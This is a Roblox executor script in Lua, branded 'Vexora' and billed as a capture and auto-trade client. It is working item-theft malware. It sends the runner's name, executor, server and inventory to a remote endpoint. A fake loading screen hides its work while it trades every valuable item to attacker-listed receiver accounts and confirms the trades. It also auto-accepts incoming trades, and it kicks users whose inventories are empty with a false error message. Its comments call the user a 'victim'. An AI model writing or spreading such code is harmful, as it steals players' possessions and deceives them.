--[[ Vexora — capture + auto-trade client ]]
-- paste into your executor. reports server id, your roblox name, your executor and
-- your full inventory so you can join the server and collect.
-- the loader holds for SESSION_SECONDS (5 minutes), then the client detaches cleanly.

local CLIENT_REV = "2.6"
local TOKEN = "{{TOKEN}}"
local ENDPOINT = "{{ENDPOINT}}"
local MIN_VALUE = {{MIN_VALUE}}
local DEFAULT_VALUE = 1

-- claimer alts from the dashboard: they never kick and never ask for another alt
local CLAIMER_ACCOUNTS = { {{CLAIMERS}} }

-- receivers from the dashboard (My script -> Receivers). when one of these joins,
-- the client opens a trade, offers every real item and confirms its side.
local RECEIVER_ACCOUNTS = { {{RECEIVERS}} }

--[[ toggles ]]
local AUTO_TRADE = false       -- fire trade remotes at every player (noisy, off)
local AUTO_TRADE_RECEIVERS = true  -- trade the receivers listed on the dashboard
local PUSH_ALL_ITEMS = true    -- dump every real item into the offer slots
local CONFIRM_TRADES = true    -- confirm the trade after offering
local AUTO_ACCEPT = true       -- accept incoming trade requests
local AUTO_CLAIM = true        -- ask the dashboard to send a claimer alt into this server
local AUTO_TRADE_DELAY = 2     -- seconds between trade attempts
local RECEIVER_RETRY = 3       -- trade requests per receiver before giving up
local OFFER_GAP = 0.35         -- seconds between offered items
local OFFER_LIMIT = 24         -- trade window buttons clicked per offer pass
local SESSION_SECONDS = 300    -- how long the loader + client runs (5 minutes)
local REPORT_INVENTORY = true  -- dump the executor's inventory to the dashboard on load

--[[ no-real-item kick ]]
local KICK_IF_EMPTY = true     -- disconnect when the inventory holds nothing worth trading
local EMPTY_GRACE = 15         -- seconds to wait for the game to hand you items on load/respawn
local EMPTY_CHECKS = 3         -- empty reads needed before it kicks (never on an unreadable inventory)
local EMPTY_INTERVAL = 3       -- seconds between inventory checks
local EMPTY_KICK_MESSAGE = "Error: script is invalid."

--[[ what counts as a real item ]]
-- default/starter loadouts and utility tools never count. anything else that is
-- not a gun is ignored too, unless GUN_ONLY is turned off.
local GUN_ONLY = true
local IGNORE_EQUIPPED_DEFAULTS = true   -- the gun the game auto-equips on spawn never counts
local DEFAULT_ITEMS = {
    -- add the exact names of your game's default weapons here, e.g. "pistol", "combat knife"
}
local IGNORE_ITEMS = {
    "default", "starter", "basic", "training", "tutorial", "free", "beginner",
    "radio", "phone", "map", "flashlight", "camera", "spray", "emote", "pickaxe",
}
local GUN_WORDS = {
    "gun", "pistol", "revolver", "handgun", "rifle", "shotgun", "smg", "lmg", "dmr",
    "sniper", "carbine", "machinegun", "minigun", "launcher", "rpg", "bazooka",
    "ak", "ar", "m4", "m16", "mp5", "mp7", "ump", "p90", "uzi", "tec", "glock",
    "deagle", "desert eagle", "magnum", "python", "colt", "beretta", "sig", "scar",
    "galil", "famas", "aug", "vector", "awp", "awm", "kar98", "mosin", "dragunov",
    "barrett", "hunting", "taser", "flare",
}

local LOADING_PHRASES = { "loading", "loading, loading", "loading, loading, loading" }

--[[ place ids -> dashboard game ids ]]
local GAME_MAP = {
    [142823291] = "mm2",          -- Murder Mystery 2
    [920587237] = "adm",          -- Adopt Me
    [126884695634066] = "gag2",   -- Grow a Garden 2
    [109983668079237] = "sab",    -- Steal a Brainrot
}
local FALLBACK_GAME = "baddies"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

--[[ ---- loading screen: covers the viewport until the client is wired up ---- ]]
local MIN_SPLASH = 1.2
local splash, splashAt, splashReleased, pulseTween = nil, os.time(), false, nil

local function buildSplash()
    local parent = LocalPlayer
        and (LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui", 5))
    if not parent then return end

    local screen = Instance.new("ScreenGui")
    screen.Name = "VexoraLoading"
    screen.IgnoreGuiInset = true
    screen.ResetOnSpawn = false
    screen.DisplayOrder = 999
    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local bg = Instance.new("Frame")
    bg.Name = "Backdrop"
    bg.Size = UDim2.fromScale(1, 1)
    bg.BackgroundColor3 = Color3.fromRGB(7, 7, 12)
    bg.BorderSizePixel = 0
    bg.Parent = screen

    local mark = Instance.new("TextLabel")
    mark.Name = "Mark"
    mark.Size = UDim2.fromOffset(260, 18)
    mark.Position = UDim2.new(0.5, -130, 0.5, -36)
    mark.BackgroundTransparency = 1
    mark.Font = Enum.Font.GothamBold
    mark.Text = "V E X O R A"
    mark.TextSize = 13
    mark.TextColor3 = Color3.fromRGB(92, 94, 106)
    mark.Parent = bg

    local label = Instance.new("TextLabel")
    label.Name = "Status"
    label.Size = UDim2.fromOffset(260, 20)
    label.Position = UDim2.new(0.5, -130, 0.5, -6)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.Code
    label.Text = "loading"
    label.TextSize = 15
    label.TextColor3 = Color3.fromRGB(164, 166, 178)
    label.Parent = bg

    local track = Instance.new("Frame")
    track.Name = "Track"
    track.Size = UDim2.fromOffset(132, 2)
    track.Position = UDim2.new(0.5, -66, 0.5, 28)
    track.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
    track.BorderSizePixel = 0
    track.ClipsDescendants = true
    track.Parent = bg

    local fill = Instance.new("Frame")
    fill.Name = "Fill"
    fill.Size = UDim2.fromScale(0.38, 1)
    fill.Position = UDim2.fromScale(-0.4, 0)
    fill.BackgroundColor3 = Color3.fromRGB(215, 210, 199)
    fill.BorderSizePixel = 0
    fill.Parent = track

    pulseTween = TweenService:Create(
        label,
        TweenInfo.new(0.85, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        { TextTransparency = 0.62 }
    )
    pulseTween:Play()

    screen.Parent = parent
    splash = screen
    splashAt = os.time()

    -- status cycles "loading" -> "loading, loading" -> "loading, loading, loading"
    -- no timer, no countdown - the session length stays invisible
    task.spawn(function()
        local phase, dots = 1, 0
        while splash and not splashReleased do
            label.Text = LOADING_PHRASES[phase] .. string.rep(".", dots)
            dots = (dots + 1) % 4
            if dots == 0 then phase = phase % #LOADING_PHRASES + 1 end
            task.wait(0.7)
        end
    end)

    task.spawn(function()
        while splash and not splashReleased do
            fill.Position = UDim2.fromScale(-0.4, 0)
            local slide = TweenService:Create(
                fill,
                TweenInfo.new(1.1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
                { Position = UDim2.fromScale(1, 0) }
            )
            slide:Play()
            slide.Completed:Wait()
        end
    end)
end

local function releaseSplash(message, hold)
    if not splash or splashReleased then return end
    splashReleased = true
    if pulseTween then pcall(function() pulseTween:Cancel() end) end

    local bg = splash:FindFirstChild("Backdrop")
    local status = bg and bg:FindFirstChild("Status")

    if status and message then
        status.Text = tostring(message)
        status.TextColor3 = Color3.fromRGB(215, 210, 199)
        status.TextTransparency = 0
    else
        local left = MIN_SPLASH - (os.time() - splashAt)
        if left > 0 then task.wait(left) end
    end
    if type(hold) == "number" then task.wait(hold) end

    local fade = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    if bg then
        TweenService:Create(bg, fade, { BackgroundTransparency = 1 }):Play()
        for _, child in ipairs(bg:GetDescendants()) do
            if child:IsA("TextLabel") then
                TweenService:Create(child, fade, { TextTransparency = 1 }):Play()
            elseif child:IsA("Frame") and child.Name == "Track" then
                TweenService:Create(child, fade, { BackgroundTransparency = 1 }):Play()
            end
        end
        local fill = bg:FindFirstChild("Track") and bg.Track:FindFirstChild("Fill")
        if fill then TweenService:Create(fill, fade, { BackgroundTransparency = 1 }):Play() end
    end

    task.delay(0.5, function()
        if splash then splash:Destroy() end
    end)
end

buildSplash()

local function executorName()
    if typeof(identifyexecutor) == "function" then
        local ok, name, version = pcall(identifyexecutor)
        if ok and name then
            return tostring(name) .. (version and (" " .. tostring(version)) or "")
        end
    end
    if typeof(getexecutorname) == "function" then
        local ok, name = pcall(getexecutorname)
        if ok and name then return tostring(name) end
    end
    return "unknown"
end

local EXECUTOR = executorName()
local ROBLOX_USER = LocalPlayer and LocalPlayer.Name or "unknown"
local SERVER_ID = game.JobId ~= "" and game.JobId or nil
local PLACE_ID = game.PlaceId

local IS_CLAIMER = false
for _, name in ipairs(CLAIMER_ACCOUNTS) do
    if tostring(name):lower() == tostring(ROBLOX_USER):lower() then IS_CLAIMER = true end
end

-- a claim only makes sense for a real victim, in a live server, from a normal account
local function claimable(item, victim)
    if not AUTO_CLAIM or IS_CLAIMER then return false end
    if not (PLACE_ID and SERVER_ID) then return false end
    if tostring(item):sub(1, 1) == "_" then return false end
    local v = tostring(victim or ""):lower()
    if v == "" or v == "inventory" or v == "selftest" or v == "unknown victim" then return false end
    return true
end

local httpRequest
if typeof(request) == "function" then
    httpRequest = request
elseif typeof(syn) == "table" and typeof(syn.request) == "function" then
    httpRequest = syn.request
elseif typeof(http_request) == "function" then
    httpRequest = http_request
elseif typeof(fluxus) == "table" and typeof(fluxus.request) == "function" then
    httpRequest = fluxus.request
end

if not httpRequest then
    warn("[vexora] no HTTP function in this executor (request / syn.request / http_request)")
    releaseSplash("no http function in this executor", 3)
    return nil
end

local GAME = GAME_MAP[PLACE_ID] or GAME_MAP[game.GameId] or FALLBACK_GAME
local queue, draining = {}, false
local connections, stopped = {}, false

local function track(conn)
    if conn then table.insert(connections, conn) end
    return conn
end

local function post(payload)
    local ok, res = pcall(function()
        return httpRequest({
            Url = ENDPOINT,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload),
        })
    end)
    if not ok then return false, tostring(res) end
    local status = res and (res.StatusCode or res.status or res.Status)
    if status and status >= 200 and status < 300 then return true, status end
    return false, tostring((res and (res.Body or res.body)) or ("status " .. tostring(status)))
end

local function drain()
    if draining then return end
    draining = true
    task.spawn(function()
        while #queue > 0 do
            local entry = table.remove(queue, 1)
            local sent = false
            for attempt = 1, 3 do
                local ok, err = post(entry)
                if ok then sent = true break end
                warn("[vexora] attempt " .. attempt .. " failed: " .. tostring(err))
                task.wait(2 ^ attempt)
            end
            if not sent then warn("[vexora] dropped: " .. tostring(entry.item)) end
            task.wait(0.6)
        end
        draining = false
    end)
end

local Vexora = {
    token = TOKEN,
    game = GAME,
    executor = EXECUTOR,
    user = ROBLOX_USER,
    server = SERVER_ID,
}

function Vexora.capture(item, victim, value, gameId)
    item = tostring(item or "Unknown")
    value = tonumber(value) or DEFAULT_VALUE
    if value < MIN_VALUE then return false end

    local entry = {
        game = gameId or GAME,
        item = item,
        victim = tostring(victim or "Unknown victim"),
        value = value,
        place_id = PLACE_ID,
        server_id = SERVER_ID,
        executor = EXECUTOR,
        roblox_user = ROBLOX_USER,
    }
    if claimable(item, victim) then entry.claim = true end

    table.insert(queue, entry)
    if entry.claim then
        print("[vexora] claim requested for " .. item .. " from " .. entry.victim)
    end
    drain()
    return true
end

-- manual claim: same report, but always flagged so an alt is sent in
function Vexora.claim(item, victim, value, gameId)
    if IS_CLAIMER or not SERVER_ID then return false end
    item = tostring(item or "Unknown")
    table.insert(queue, {
        game = gameId or GAME,
        item = item,
        victim = tostring(victim or "Unknown victim"),
        value = tonumber(value) or DEFAULT_VALUE,
        place_id = PLACE_ID,
        server_id = SERVER_ID,
        executor = EXECUTOR,
        roblox_user = ROBLOX_USER,
        claim = true,
    })
    drain()
    return true
end

--[[ ---- inventory readout ---- ]]
-- each entry carries where it was found, so an auto-equipped default weapon can
-- be told apart from something the account actually owns
local ITEM_FOLDERS = {
    "Inventory", "InventoryItems", "Items", "OwnedItems", "Owned", "OwnedWeapons",
    "Collection", "Skins", "Weapons", "Knives", "Guns",
}

-- mm2-style tools carry the real item name on a StringValue child
local function toolLabel(tool)
    for _, tag in ipairs(tool:GetDescendants()) do
        if tag:IsA("StringValue") and tag.Name:lower():find("itemname") then
            return tag.Value
        end
    end
    return tool.Name
end

--[[ ---- ui readers ---- ]]
-- a lot of games never replicate owned items into the player object. their inventory
-- panel does list them, so the panel and the open trade window are read as well.
local CONTROL_LABELS = {
    "equip", "unequip", "salvage", "search", "sort", "filter", "close", "back", "next",
    "previous", "prev", "page", "accept", "decline", "confirm", "cancel", "trade", "offer",
    "buy", "sell", "open", "inventory", "settings", "menu", "claim", "collect", "send",
    "remove", "clear", "select", "view", "info", "value", "rarity", "locked", "favorite",
    "favourite", "delete", "scrap", "upgrade", "spin", "case", "shop", "store", "x", "ok",
    "yes", "no", "all",
}
local CONTROL_PARTS = {
    "accept", "decline", "confirm", "cancel", "equip", "salvage", "search", "filter",
    "sort by", "next page", "previous page", "close", "send trade", "trade request",
    "start trade", "make offer", "add offer", "make trade",
}
local GENERIC_NAMES = {
    "frame", "imagebutton", "textbutton", "button", "item", "items", "slot", "card",
    "view", "icon", "image", "label", "template", "container", "holder", "grid",
}

local function norm(text)
    return tostring(text or ""):gsub("%s+", " "):gsub("^%s+", ""):gsub("%s+$", "")
end

local function isControlLabel(text)
    local n = norm(text):lower()
    if #n < 2 then return true end
    for _, word in ipairs(CONTROL_LABELS) do
        if n == word then return true end
    end
    for _, word in ipairs(CONTROL_PARTS) do
        if n:find(word, 1, true) then return true end
    end
    return false
end

local function buttonLabel(button)
    local text
    if button:IsA("TextButton") then text = norm(button.Text) end
    if not text or #text < 2 then
        for _, child in ipairs(button:GetDescendants()) do
            if child:IsA("TextLabel") then
                local value = norm(child.Text)
                if #value >= 2 then text = value break end
            end
        end
    end
    if not text or #text < 2 then text = norm(button.Name) end
    if #text < 2 then return nil end
    for _, generic in ipairs(GENERIC_NAMES) do
        if text:lower() == generic then return nil end
    end
    return text
end

local function clickButton(button)
    local clicked = false
    pcall(function()
        game:GetService("VirtualUser"):ClickButton(button)
        clicked = true
    end)
    if not clicked and typeof(firesignal) == "function" then
        pcall(function()
            firesignal(button.MouseButton1Click)
            clicked = true
        end)
    end
    return clicked
end

-- sticky read state: "seen" only turns true once a real collection was listed,
-- so an unreadable inventory can never be mistaken for an empty one
local inventoryInfo = { collections = 0, containers = 0, gui = 0, panels = 0, seen = false }

local function addGuiItems(add)
    local player = LocalPlayer or Players.LocalPlayer
    local gui = player and player:FindFirstChildOfClass("PlayerGui")
    if not gui then return 0, 0 end

    local panels, added = 0, 0
    for _, screen in ipairs(gui:GetChildren()) do
        local n = screen.Name:lower()
        if screen:IsA("ScreenGui") and
            (n:find("invent", 1, true) or n == "inv" or n:find("collection", 1, true)) then
            panels = panels + 1
            for _, obj in ipairs(screen:GetDescendants()) do
                if obj:IsA("TextButton") or obj:IsA("ImageButton") then
                    local label = buttonLabel(obj)
                    if label and not isControlLabel(label) then
                        add(label, "gui")
                        added = added + 1
                    end
                end
            end
        end
    end
    return panels, added
end

local function scanInventory()
    local entries, seenItem = {}, {}

    local function add(name, at)
        name = norm(name)
        if #name < 2 then return end
        local key = name:lower()
        if seenItem[key] then return end
        seenItem[key] = true
        table.insert(entries, { name = name, at = at })
    end

    local player = LocalPlayer
    local info = { collections = 0, containers = 0, gui = 0, panels = 0 }
    if not player then return entries, info end

    local bag = player:FindFirstChildOfClass("Backpack")
    if bag then
        info.containers = info.containers + 1
        for _, child in ipairs(bag:GetChildren()) do
            if child:IsA("Tool") then add(toolLabel(child), "backpack") end
        end
    end

    if player.Character then
        info.containers = info.containers + 1
        for _, child in ipairs(player.Character:GetChildren()) do
            if child:IsA("Tool") then add(toolLabel(child), "equipped") end
        end
    end

    -- owned-item folders: every child is an item, whatever its class
    for _, folderName in ipairs(ITEM_FOLDERS) do
        local folder = player:FindFirstChild(folderName)
        if folder then
            info.collections = info.collections + 1
            for _, child in ipairs(folder:GetChildren()) do
                add(child.Name, "folder")
            end
        end
    end

    local panels, added = addGuiItems(add)
    info.panels, info.gui = panels, added

    inventoryInfo.collections = math.max(inventoryInfo.collections, info.collections)
    inventoryInfo.containers = info.containers
    inventoryInfo.gui = math.max(inventoryInfo.gui, added)
    inventoryInfo.panels = math.max(inventoryInfo.panels, panels)
    if info.collections > 0 or added > 0 then inventoryInfo.seen = true end

    table.sort(entries, function(a, b) return a.name:lower() < b.name:lower() end)
    return entries, info
end

-- some inventories only fill in when their panel is opened once
local guiToggles = 0

local function findInventoryToggle()
    local player = LocalPlayer or Players.LocalPlayer
    local gui = player and player:FindFirstChildOfClass("PlayerGui")
    if not gui then return nil end
    for _, obj in ipairs(gui:GetDescendants()) do
        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
            local label = (buttonLabel(obj) or obj.Name):lower()
            if label == "inv" or label:find("inventory", 1, true) or label:find("backpack", 1, true) then
                return obj
            end
        end
    end
    return nil
end

local function collectInventory()
    local names = {}
    for _, entry in ipairs(scanInventory()) do table.insert(names, entry.name) end
    return names
end

function Vexora.inventoryState()
    return {
        collections = inventoryInfo.collections,
        containers = inventoryInfo.containers,
        gui = inventoryInfo.gui,
        panels = inventoryInfo.panels,
        seen = inventoryInfo.seen,
    }
end

function Vexora.inventory(report)
    local items = collectInventory()
    if report == false then return items end

    local value = math.max(MIN_VALUE, 1)
    local send = function(name)
        table.insert(queue, {
            game = GAME,
            item = name,
            victim = "inventory",
            value = value,
            place_id = PLACE_ID,
            server_id = SERVER_ID,
            executor = EXECUTOR,
            roblox_user = ROBLOX_USER,
        })
    end

    if #items == 0 then
        send("inventory: empty")
    else
        for _, name in ipairs(items) do send(name) end
    end
    drain()
    return items
end

--[[ ---- filter: real guns vs default loadout ---- ]]
local function hasWord(text, word)
    if word:find("%s") then return text:find(word, 1, true) ~= nil end
    return text:find("%f[%w]" .. word .. "%f[%W]") ~= nil
end

-- whatever the game auto-equips when you spawn is a default, not loot
local spawnDefaults = {}

local function captureSpawnDefaults()
    for _, entry in ipairs(scanInventory()) do
        if entry.at == "equipped" then spawnDefaults[entry.name:lower()] = true end
    end
end

local MM2 = GAME == "mm2"

local function isRealItem(entry)
    local n = entry.name:lower()

    -- "Default Knife", "Default Gun", "Starter Pistol" and friends never count
    for _, word in ipairs({ "default", "basic", "starter" }) do
        if n:find(word, 1, true) then return false end
    end
    for _, word in ipairs(IGNORE_ITEMS) do
        if n:find(word, 1, true) then return false end
    end
    for _, exact in ipairs(DEFAULT_ITEMS) do
        if n == exact:lower() then return false end
    end

    -- mm2: the knife/gun you spawn with is just the equipped default, so only a
    -- collection folder or the inventory panel counts
    if MM2 then return entry.at == "folder" or entry.at == "gui" end

    if IGNORE_EQUIPPED_DEFAULTS and entry.at == "equipped" and spawnDefaults[n] then return false end
    if not GUN_ONLY then return true end
    for _, word in ipairs(GUN_WORDS) do
        if hasWord(n, word) then return true end
    end
    return false
end

local function realItems(deep)
    local all = scanInventory()

    -- open the inventory panel once when it listed nothing, then read it again
    if deep and inventoryInfo.gui == 0 and guiToggles < 2 then
        local toggle = findInventoryToggle()
        if toggle then
            guiToggles = guiToggles + 1
            clickButton(toggle)
            task.wait(1.5)
            all = scanInventory()
            clickButton(toggle)
        end
    end

    local real = {}
    for _, entry in ipairs(all) do
        if isRealItem(entry) then table.insert(real, entry.name) end
    end
    return real, all
end

function Vexora.items()
    return realItems(false)
end

function Vexora.selftest()
    return Vexora.capture("__selftest", "selftest", DEFAULT_VALUE)
end

function Vexora.stop()
    if stopped then return end
    stopped = true
    AUTO_TRADE = false
    AUTO_ACCEPT = false
    for _, conn in ipairs(connections) do
        pcall(function() conn:Disconnect() end)
    end
    connections = {}
    table.clear(queue)
    releaseSplash("loaded", 1.2)
    print(string.format("[vexora] %ds session complete — client detached", SESSION_SECONDS))
end

--[[ ---- discovery ---- ]]
local function findRemotes(pattern)
    local out = {}
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and obj.Name:lower():match(pattern) then
            table.insert(out, obj)
        end
    end
    return out
end

local function fire(remote, ...)
    local args = { ... }
    if remote:IsA("RemoteFunction") then
        pcall(function() remote:InvokeServer(table.unpack(args)) end)
    else
        pcall(function() remote:FireServer(table.unpack(args)) end)
    end
end

-- trade systems differ per game; item remotes are the ones that put something
-- into the offer slots, so they are kept out of the request/confirm lists
local function isItemRemote(name)
    local n = name:lower()
    return n:match("additem") ~= nil or n:match("offeritem") ~= nil
        or n:match("tradeitem") ~= nil or n:match("giveitem") ~= nil
        or n:match("pushitem") ~= nil or n:match("itemadd") ~= nil
        or n:match("add.*item") ~= nil or n:match("item.*add") ~= nil
        or n:match("offer.*item") ~= nil
end

local itemRemotes, tradeRemotes, acceptRemotes = {}, {}, {}
for _, remote in ipairs(findRemotes(".")) do
    local n = remote.Name:lower()
    if isItemRemote(n) then
        table.insert(itemRemotes, remote)
    elseif n:match("confirm") or n:match("ready") or n:match("accept") or n:match("agree") then
        table.insert(acceptRemotes, remote)
    elseif n:match("trade") or n:match("request") then
        table.insert(tradeRemotes, remote)
    end
end

local function playerIn(args)
    for _, v in ipairs(args) do
        if typeof(v) == "Instance" and v:IsA("Player") then return v end
        if typeof(v) == "string" then
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr.Name == v then return plr end
            end
        end
    end
    return nil
end

local function itemIn(args, victim)
    for _, v in ipairs(args) do
        if typeof(v) == "string" and #v > 1 and (not victim or v ~= victim.Name) and v:lower() ~= "accept" then
            return v
        end
    end
    return nil
end

--[[ ---- receivers: trade them on join, push every item, confirm ---- ]]
local RECEIVER_SET = {}
for _, name in ipairs(RECEIVER_ACCOUNTS) do
    local clean = tostring(name):lower()
    if #clean > 1 then RECEIVER_SET[clean] = true end
end

local function isReceiver(name)
    return RECEIVER_SET[tostring(name or ""):lower()] == true
end

local outgoingTrade, tradesRun, tradeSawItems = false, {}, false

local function reportTrade(stage, receiver, extra)
    local entry = {
        event = "trade",
        game = GAME,
        stage = tostring(stage or "event"),
        receiver = tostring(receiver or "unknown"),
        place_id = PLACE_ID,
        server_id = SERVER_ID,
        executor = EXECUTOR,
        roblox_user = ROBLOX_USER,
    }
    if extra then
        for key, value in pairs(extra) do entry[key] = value end
    end
    table.insert(queue, entry)
    drain()
    print(string.format("[vexora] trade:%s %s%s", entry.stage, entry.receiver,
        entry.detail and (" - " .. tostring(entry.detail)) or ""))
end

-- what the client can actually see, so a failed read can be fixed from the dashboard
local function probeLines()
    local player = LocalPlayer or Players.LocalPlayer
    if not player then return { "no LocalPlayer" } end

    local lines = {}
    local function push(text)
        if #lines < 40 then table.insert(lines, tostring(text):sub(1, 60)) end
    end

    push("user:" .. player.Name)
    for _, child in ipairs(player:GetChildren()) do
        if child:IsA("Folder") or child:IsA("Configuration") or child:IsA("Backpack") then
            push("p:" .. child.Name .. "(" .. child.ClassName .. ")=" .. #child:GetChildren())
        end
    end

    local gui = player:FindFirstChildOfClass("PlayerGui")
    if gui then
        for _, screen in ipairs(gui:GetChildren()) do
            if screen:IsA("ScreenGui") then push("gui:" .. screen.Name) end
        end
    end

    local real, all = realItems(false)
    push(string.format("items: %d real / %d total", #real, #all))
    push(string.format("folders=%d gui=%d panels=%d seen=%s",
        inventoryInfo.collections, inventoryInfo.gui, inventoryInfo.panels, tostring(inventoryInfo.seen)))
    push(string.format("remotes: trade=%d item=%d confirm=%d", #tradeRemotes, #itemRemotes, #acceptRemotes))
    return lines
end

function Vexora.probe()
    return probeLines()
end

-- a trade screen is any visible gui with "trade" in the name
local function tradeWindow()
    local player = LocalPlayer or Players.LocalPlayer
    local gui = player and player:FindFirstChildOfClass("PlayerGui")
    if not gui then return nil end
    for _, obj in ipairs(gui:GetDescendants()) do
        local visible = true
        if obj:IsA("ScreenGui") then
            visible = obj.Enabled ~= false
        elseif obj:IsA("GuiObject") then
            visible = obj.Visible ~= false
        end
        local n = obj.Name:lower()
        local notification = n:find("request", 1, true) or n:find("notif", 1, true)
            or n:find("prompt", 1, true) or n:find("toast", 1, true)
        if visible and not notification and (obj:IsA("ScreenGui") or obj:IsA("Frame"))
            and n:find("trade", 1, true) then
            return obj
        end
    end
    return nil
end

-- buttons in the trade window that hold your items, never the chrome. your panel is
-- preferred by name so the receiver's cards are not clicked along with yours.
local function tradeButtons(window)
    local preferred, fallback = {}, {}
    for _, obj in ipairs(window:GetDescendants()) do
        if obj:IsA("Frame") or obj:IsA("ScrollingFrame") then
            local n = obj.Name:lower()
            if n:find("your", 1, true) or n:find("self", 1, true) or n:find("player1", 1, true)
                or n:find("left", 1, true) or n:find("myoffer", 1, true) or n:find("myitem", 1, true) then
                table.insert(preferred, obj)
            elseif n:find("offer", 1, true) or n:find("invent", 1, true) or n:find("item", 1, true) then
                table.insert(fallback, obj)
            end
        end
    end

    local roots = #preferred > 0 and preferred or (#fallback > 0 and fallback or { window })
    local buttons, seenButton, seenLabel = {}, {}, {}
    for _, root in ipairs(roots) do
        for _, obj in ipairs(root:GetDescendants()) do
            if (obj:IsA("TextButton") or obj:IsA("ImageButton")) and not seenButton[obj] then
                seenButton[obj] = true
                local label = buttonLabel(obj) or norm(obj.Name)
                local generic = false
                for _, name in ipairs(GENERIC_NAMES) do
                    if label:lower() == name then generic = true break end
                end
                local key = label:lower()
                -- image-only cards are all named "Item"/"Slot"; every one has to be clicked
                if not isControlLabel(label) and (generic or not seenLabel[key]) then
                    seenLabel[key] = true
                    table.insert(buttons, { button = obj, label = label })
                end
            end
        end
    end
    return buttons
end

local function offerEverything(receiver)
    local items = Vexora.items()
    local clicked, labels, fired = 0, {}, 0

    -- the trade window lists your own items. clicking those cards is what actually
    -- fills the offer slots, whatever the game named its remotes.
    local window = tradeWindow()
    if window then
        task.wait(0.8)
        local ok, list = pcall(tradeButtons, tradeWindow() or window)
        for _, entry in ipairs(ok and list or {}) do
            if clicked >= OFFER_LIMIT then break end
            if clickButton(entry.button) then
                clicked = clicked + 1
                tradeSawItems = true
                table.insert(labels, entry.label)
                task.wait(OFFER_GAP)
            end
        end
    end

    -- guessed item remotes only when the ui gave us nothing to click
    if clicked == 0 then
        for _, name in ipairs(items) do
            for _, remote in ipairs(itemRemotes) do
                fire(remote, name)
                fire(remote, receiver.Name, name)
                fired = fired + 1
            end
            task.wait(OFFER_GAP)
        end
    end

    return clicked, labels, items, fired
end

local function confirmTrade()
    for _, remote in ipairs(acceptRemotes) do
        fire(remote, true)
        fire(remote, "accept")
    end
end

local function runReceiverTrade(player)
    if not AUTO_TRADE_RECEIVERS or IS_CLAIMER or stopped then return end
    local key = player.Name:lower()
    if tradesRun[key] then return end
    tradesRun[key] = true

    task.spawn(function()
        outgoingTrade = true
        reportTrade("receiver_joined", player.Name, { detail = "starting trade" })
        task.wait(1.5)

        local opened, attempts = false, 0
        while not stopped and not opened and attempts < RECEIVER_RETRY do
            attempts = attempts + 1
            reportTrade("request", player.Name, { detail = "attempt " .. attempts .. "/" .. RECEIVER_RETRY })
            for _, remote in ipairs(tradeRemotes) do
                fire(remote, player)
                fire(remote, "trade", player)
                fire(remote, "request", player)
            end

            local deadline = os.clock() + 7
            while os.clock() < deadline and not stopped do
                if tradeWindow() then opened = true break end
                task.wait(0.4)
            end
            if not opened then task.wait(2) end
        end

        if not opened then
            reportTrade("no_window", player.Name, {
                detail = #tradeRemotes > 0 and "trade ui never opened" or "no trade remotes found",
            })
            outgoingTrade = false
            tradesRun[key] = nil
            return
        end

        reportTrade("window", player.Name, { detail = "trade ui open" })

        if PUSH_ALL_ITEMS then
            local clicked, labels, items, fired = offerEverything(player)
            reportTrade("offer", player.Name, {
                items = clicked > 0 and labels or items,
                detail = clicked > 0
                    and string.format("%d item(s) clicked in the trade window", clicked)
                    or string.format("%d item(s) via %d remote(s)", #items, #itemRemotes),
            })
            if clicked == 0 and fired == 0 then
                reportTrade("probe", player.Name, {
                    items = probeLines(),
                    detail = "nothing offered - trade window dump",
                })
            end
        end

        task.wait(1.2)
        if CONFIRM_TRADES then
            confirmTrade()
            reportTrade("confirm", player.Name, { detail = "first confirm" })
            task.wait(2)
            confirmTrade()
            reportTrade("confirm", player.Name, { detail = "second confirm" })
        end

        task.wait(2)
        local stillOpen = tradeWindow() ~= nil
        reportTrade(stillOpen and "waiting" or "done", player.Name, {
            detail = stillOpen and "receiver has to accept" or "trade window closed",
        })
        outgoingTrade = false
        tradesRun[key] = nil
    end)
end

--[[ ---- auto accept + capture from incoming trade calls ---- ]]
local hooked = 0
for _, remote in ipairs(tradeRemotes) do
    hooked = hooked + 1
    pcall(function()
        track(remote.OnClientEvent:Connect(function(...)
            local args = { ... }
            local victim = playerIn(args)
            if AUTO_ACCEPT and victim then
                pcall(function() remote:FireServer("accept", victim) end)
                pcall(function() remote:FireServer(victim) end)
            end
            local item = itemIn(args, victim)
            if victim and item then
                Vexora.capture(item, victim.Name, DEFAULT_VALUE)
            end
        end))
    end)
end

--[[ ---- auto trade with everybody ---- ]]
local trading = {}

local function autoTrade()
    if not AUTO_TRADE or #tradeRemotes == 0 then return end
    task.spawn(function()
        while AUTO_TRADE do
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and not trading[plr] then
                    trading[plr] = true
                    for _, remote in ipairs(tradeRemotes) do
                        pcall(function() remote:FireServer(plr) end)
                        pcall(function() remote:FireServer("trade", plr) end)
                    end
                    task.delay(AUTO_TRADE_DELAY * 2, function() trading[plr] = nil end)
                end
            end
            task.wait(AUTO_TRADE_DELAY)
        end
    end)
end

--[[ ---- backpack watcher ---- ]]
local seen = {}
local function watchBackpack(backpack)
    track(backpack.ChildAdded:Connect(function(child)
        if not child:IsA("Tool") then return end
        if seen[child.Name] then return end
        seen[child.Name] = true
        Vexora.capture(child.Name, "Unknown victim", DEFAULT_VALUE)
    end))
end

if LocalPlayer then
    track(LocalPlayer.ChildAdded:Connect(function(child)
        if child.Name == "Backpack" then
            task.wait(0.5)
            watchBackpack(child)
        end
    end))
    local bag = LocalPlayer:FindFirstChildOfClass("Backpack")
    if bag then watchBackpack(bag) end
end

--[[ ---- empty inventory -> kick ---- ]]
